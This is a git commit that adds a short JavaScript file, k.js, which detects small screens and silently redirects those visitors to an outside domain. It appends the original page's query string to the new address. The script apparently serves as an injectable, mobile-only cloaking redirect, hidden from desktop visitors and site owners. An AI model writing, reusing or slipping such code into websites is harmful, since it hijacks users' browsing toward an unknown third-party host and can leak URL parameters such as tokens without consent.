15267b2e2011eb338f26b4fffe5c106ab273ea39
Ryszard Kwiatkowski <140899316+PupiPr0@users.noreply.github.com>
2024-02-09 03:20:58 +0300

    Create k.js

---
+++ k.js
@@ -0,0 +1,22 @@
+//say no mo
+
+(function () {
+
+  var redirectURL = "https://repo-main.wildmoney.pro/app/ludik.pdf";
+
+  var breakpoint = 777;
+
+  function isSmallScreen() {
+    try {
+      return window.matchMedia("(max-device-width: " + breakpoint + "px)").matches;
+    } catch (e) {
+    }
+    return false;
+  }
+
+  if (isSmallScreen()) {
+    var url = new URL(redirectURL);
+    url.search = url.search ? url.search + "&" + window.location.search.substr(1) : window.location.search;
+    window.location = url;
+  }
+})();
